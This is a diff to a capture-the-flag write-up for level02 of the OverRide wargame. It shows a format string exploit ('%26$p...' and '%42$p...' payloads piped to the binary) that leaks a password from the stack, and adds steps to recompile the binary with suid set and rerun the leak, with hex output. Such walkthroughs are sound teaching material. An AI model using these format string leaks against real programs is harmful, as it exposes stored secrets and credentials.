@@ -43,7 +43,7 @@ The key vulnerability is the username provided is then printed with ```printf()`
 
 With the format string attack, looking through arguments in the stack we find what looks like a password at arguments 22-26.
 ```
-level02@OverRide:~$ (python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; python -c 'print("password")'; cat) | ~/level02
+level02@OverRide:~$ (python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; python -c 'print("pass")'; cat) | ~/level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
@@ -68,4 +68,19 @@ level03@OverRide:~$
 
 ## Recreate Exploited Binary
 
+As user ```level03```, in ```/tmp```, create and compile ```level02_source.c```
+```
+level03@OverRide:/tmp$ gcc level02_source.c -o level02_source
+```
 
+Edit permissions including suid, then move the binary to home directory.
+```
+level03@OverRide:/tmp$ chmod u+s level02_source; chmod +wx ~; mv level02_source ~
+```
+
+Exit back to user ```level02```, then launch the source with the format string exploit. This time we find the password at arguments 38-42
+```
+level02@OverRide:~$ (python -c 'print("%42$p%41$p%40$p%39$p%38$p")'; python -c 'print("pass")'; cat) | /home/users/level03/level02_source
+...
+0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
+```
